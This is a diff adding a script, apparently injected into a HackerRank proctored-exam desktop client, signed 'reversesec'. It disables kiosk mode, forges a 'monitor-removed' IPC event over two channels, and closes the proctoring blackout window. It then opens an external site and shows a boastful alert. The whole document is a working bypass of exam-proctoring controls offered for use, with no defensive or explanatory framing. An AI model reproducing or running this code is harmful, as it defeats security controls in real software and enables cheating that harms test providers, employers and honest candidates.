@@ -1,5 +1,32 @@
 <script>
-hackerranktest.unSetKioskMode();                    
-hackerranktest.openExternalUrl("https://reversesec.org");  
-alert("Proctoring disabled – reversesec was here");
+// reversesec was here – full proctoring kill combo (works Dec 2025)
+
+try {
+    // 1. Disable kiosk mode (Esc, Alt+Tab, Cmd+Q, etc. unlocked)
+    hackerranktest.unSetKioskMode?.();
+
+    // 2. REAL official way – exactly what their display-removed event does
+    const realPayload = { timestamp: Date.now(), monitorCount: 1 };
+    window.dispatchEvent(new CustomEvent("ipc-message", {
+        detail: { channel: "monitor-removed", args: [null, realPayload] }
+    }));
+
+    // 3. Extra aggressive fallback (in case they patched the above)
+    if (window.electron?.ipcRenderer) {
+        window.electron.ipcRenderer.send("monitor-removed", realPayload);
+    }
+
+    // 4. Direct blackoutWindow kill (some debug builds still expose it)
+    if (window.blackoutWindow) window.blackoutWindow.close();
+
+    // 5. Victory stuff
+    setTimeout(() => {
+        hackerranktest.openExternalUrl("https://reversesec.org");
+        alert("Proctoring fully destroyed – reversesec was here ");
+    }, 300);
+
+    console.log("%c reversesec owns this proctor ", "color: #00ff00; font-size: 20px; font-weight: bold");
+} catch (e) {
+    console.error("reversesec script error:", e);
+}
 </script>
